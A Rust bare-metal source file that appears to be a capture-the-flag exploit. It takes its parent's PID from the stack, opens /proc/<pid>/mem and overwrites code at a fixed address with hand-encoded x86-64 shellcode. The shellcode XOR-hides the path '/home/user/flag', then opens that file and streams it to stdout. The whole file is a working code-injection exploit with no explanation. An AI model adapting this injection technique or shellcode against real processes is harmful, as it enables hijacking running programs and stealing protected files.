#![no_std]
#![no_main]
#![feature(asm)]
#![allow(non_upper_case_globals)]

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

const SYS_open: u64 = 2;
const SYS_lseek: u64 = 8;
const SYS_write: u64 = 1;
const O_RDWR: u64 = 2;
const SEEK_SET: u64 = 0;

unsafe fn syscall2(scnum: u64, arg1: u64, arg2: u64) -> u64 {
    let ret: u64;
    asm!(
        "syscall",
        in("rax") scnum,
        in("rdi") arg1,
        in("rsi") arg2,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

unsafe fn syscall3(scnum: u64, arg1: u64, arg2: u64, arg3: u64) -> u64 {
    let ret: u64;
    asm!(
        "syscall",
        in("rax") scnum,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

fn my_itoa(mut n: u32, dst: &mut [u8]) {
    // No bounds checks. But a 10-element buffer is sufficient for all cases.
    let mut i = dst.len() - 1;

    loop {
        dst[i] = (n % 10) as u8 + b'0';
        n /= 10;
        if n == 0 {
            break;
        }
        i -= 1;
    }
}

#[no_mangle]
#[link_section = ".text.prologue"]
fn _start() -> ! {
    let pid: u32;
    // steal the pid from the stack of our caller
    unsafe {
        asm!(
            "mov {0:e}, dword ptr [rbp - 0x4]",
            out(reg) pid,
        );
    }
    let mut buf: [u8; 21] = *b"/proc////////////mem\0";
    my_itoa(pid, &mut buf[6..16]);

    let fd = unsafe { syscall2(SYS_open, buf.as_ptr() as u64, O_RDWR) };
    let target = 0x4022e3;
    unsafe { syscall3(SYS_lseek, fd, target, SEEK_SET) };

    let shellcode = [
        0x48u8, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x50, 0x48, 0xb8, 0x64, 0x73, 0x2e,
        0x67, 0x6d, 0x60, 0x66, 0x1, 0x48, 0x31, 0x4, 0x24, 0x48, 0xb8, 0x2f, 0x68, 0x6f, 0x6d,
        0x65, 0x2f, 0x75, 0x73, 0x50, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x99, 0xf,
        0x5, 0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x1,
        0x5f, 0x99, 0xf, 0x5, 0xeb, 0xfe,
    ];

    unsafe {
        syscall3(
            SYS_write,
            fd,
            shellcode.as_ptr() as u64,
            shellcode.len() as u64,
        )
    };

    loop {}
}
